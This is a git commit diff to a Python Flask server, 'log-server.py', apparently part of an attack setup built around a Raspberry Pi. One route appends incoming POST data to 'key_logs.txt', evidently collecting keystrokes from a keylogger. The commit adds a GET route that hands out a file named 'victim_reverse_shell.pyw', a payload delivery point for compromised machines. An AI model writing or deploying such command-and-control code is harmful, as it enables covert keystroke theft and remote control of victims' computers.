52feb81eaf253b101af8fe9e56fd25c8fea62518
Nibba2018 <sohambiswas41@gmail.com>
2020-04-03 14:07:18 +0530

    added GET request for payloads

--- Raspberry Pi/log-server.py
+++ Raspberry Pi/log-server.py
@@ -1,14 +1,18 @@
 from flask import Flask, render_template, request
-from werkzeug import secure_filename
 app = Flask(__name__)
-	
+
+@app.route('/', methods = ['GET'])
+def get_payloads():
+    with open('payloads/victim_reverse_shell.pyw', 'r') as f:
+        return f.read()
+
 @app.route('/log', methods = ['POST'])
 def upload_file():
-   if request.method == 'POST':
-      with open("key_logs.txt", "a") as f:
-         f.write(request.data.decode())
-         f.write("\n" + "="*50 + "\n")
-      return 'ok', 200
-		
+    if request.method == 'POST':
+        with open("key_logs.txt", "a") as f:
+            f.write(request.data.decode())
+            f.write("\n" + "="*50 + "\n")
+    return 'ok', 200
+
 if __name__ == '__main__':
-   app.run()
+    app.run()
